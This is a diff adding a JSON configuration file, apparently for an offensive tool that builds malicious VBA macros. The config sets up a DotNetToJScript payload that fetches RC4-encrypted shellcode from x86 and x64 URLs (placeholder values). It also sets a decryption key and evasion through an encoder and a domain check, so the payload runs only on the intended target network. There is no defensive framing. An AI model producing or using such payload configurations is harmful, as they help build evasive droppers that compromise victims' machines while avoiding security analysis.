@@ -1,0 +1,19 @@
+{
+        "description": "DotnettoJS with RC4 encrypted payload\nEvasion technique set to domain check",
+        "template": "templates/payloads/dotnettojs-evasion-template.vba",
+        "varcount": 150,
+        "encodingoffset": 4,
+        "chunksize": 200,
+        "encodedvars":  {
+
+                                "DOMAIN":"TEST",
+                                "URL_X86":"https://RC4.encrypted.base64.shellcode.32.bit/?1=1",
+                                "URL_X64":"https://RC4.encrypted.base64.shellcode.64.bit/?1=3",
+                                "DECRYPTION_KEY":"RC4.base64.decryption.key",
+                                "WAIT_TIME":"4294967295"
+
+                        },
+        "vars": [],
+        "evasion":      ["encoder", "domain"],
+        "payload": ""
+}
